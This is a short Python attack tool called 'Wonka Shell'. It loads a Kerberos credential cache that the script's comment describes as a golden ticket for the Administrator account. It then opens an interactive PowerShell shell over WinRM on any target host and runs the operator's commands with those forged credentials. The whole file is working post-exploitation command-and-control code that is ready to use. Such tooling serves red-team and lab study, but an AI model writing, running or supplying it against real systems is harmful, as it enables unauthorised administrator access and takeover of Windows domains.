import argparse
import os
import sys
import winrm

# Wonka Shell - Use Golden Ticket for Command and Control

os.environ['KRB5CCNAME'] = os.path.abspath('Administrator.ccache')

def parse_args():
    parser = argparse.ArgumentParser(description="Wonka Shell - WinRM Kerberos Shell")
    parser.add_argument(
        'target',
        nargs='?',
        help='Target IP address or hostname'
    )
    return parser.parse_args()

def main():
    args = parse_args()
    target = args.target

    print(f"[*] Connecting to {target} via WinRM using Kerberos Golden Ticket...")
    try:
        session = winrm.Session(
            target=target,
            auth=('', ''),
            transport='kerberos'
        )
        
        # Test connection with a quick command
        test_res = session.run_ps("whoami")
        if test_res.status_code != 0:
            print("[-] Authentication check failed:", test_res.std_err.decode('utf-8'))
            sys.exit(1)
            
        print(f"[+] Connected successfully as: {test_res.std_out.decode('utf-8').strip()}")
        print(f"[+] Entering interactive WinRM shell on {target}. Type 'exit' to quit.\n")

        while True:
            try:
                cmd = input("PS C:\\> ").strip()
                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                result = session.run_ps(cmd)
                
                if result.std_out:
                    print(result.std_out.decode('utf-8', errors='ignore'))
                if result.std_err:
                    print(result.std_err.decode('utf-8', errors='ignore'), file=sys.stderr)
                    
            except KeyboardInterrupt:
                print("\n[!] Exiting shell.")
                break

    except Exception as e:
        print(f"[-] Connection error: {e}")

if __name__ == '__main__':
    main()